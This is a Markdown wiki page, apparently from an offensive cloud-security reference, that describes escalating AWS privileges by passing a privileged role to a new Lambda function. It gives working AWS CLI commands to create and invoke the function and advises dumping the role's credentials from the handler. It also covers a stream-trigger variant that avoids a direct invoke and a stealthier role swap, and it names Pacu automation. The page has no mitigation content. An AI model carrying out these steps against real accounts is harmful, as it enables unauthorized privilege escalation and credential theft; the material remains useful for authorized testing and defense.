---
title: "Lambda: PassRole to CreateFunction for a privileged execution role"
description: "iam:PassRole with lambda:CreateFunction and invoke to run attacker code under a privileged Lambda execution role."
keywords:
  - PassRole
  - Lambda
  - CreateFunction
  - execution role
  - InvokeFunction
---

# Lambda

With `iam:PassRole` and `lambda:CreateFunction` (plus `lambda:InvokeFunction`), you create a function whose **execution role** is more privileged than your own, then invoke it. The function body is your code, so it runs with the passed role's credentials, available inside the runtime through the role's environment.

## Create and invoke

```bash
# zip a handler that calls sts:get-caller-identity or does your work
aws lambda create-function \
  --function-name x --runtime python3.12 --handler h.handler \
  --role arn:aws:iam::<acct>:role/<privileged-role> \
  --zip-file fileb://f.zip
aws lambda invoke --function-name x out.json ; cat out.json
```

The handler can read `boto3.Session().get_credentials()` to dump the role's keys, or simply perform the privileged action directly.

## Force execution with a stream trigger

When `lambda:InvokeFunction` is denied but `lambda:CreateEventSourceMapping` is allowed, attach the function to a DynamoDB or Kinesis stream you can write to; a record on the stream drives the invoke under the execution role, so you never call invoke directly.

```bash
aws lambda create-function --function-name x --runtime python3.12 --handler h.handler \
  --role arn:aws:iam::<acct>:role/<privileged-role> --zip-file fileb://f.zip
aws lambda create-event-source-mapping --function-name x \
  --event-source-arn arn:aws:dynamodb:<region>:<acct>:table/<t>/stream/<ts> --starting-position LATEST
# writing an item to the table now triggers the function as the passed role
```

## Exploitation notes

- The target role's trust policy must allow `lambda.amazonaws.com`, which is standard for any role built as a Lambda execution role.
- `lambda:UpdateFunctionConfiguration` on an existing function also lets you swap its role to one you can pass, a quieter variant than creating a new function.
- No inbound network access is needed: the invoke is an API call, and results come back in the response payload.

## Tools

- **AWS CLI** (`lambda create-function` / `invoke`): the full path.
- **Pacu** (`lambda__backdoor_new_roles`, privesc modules): automates function-based escalation.

## References

- [Rhino Security Labs: AWS privilege escalation (PassRole to Lambda)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
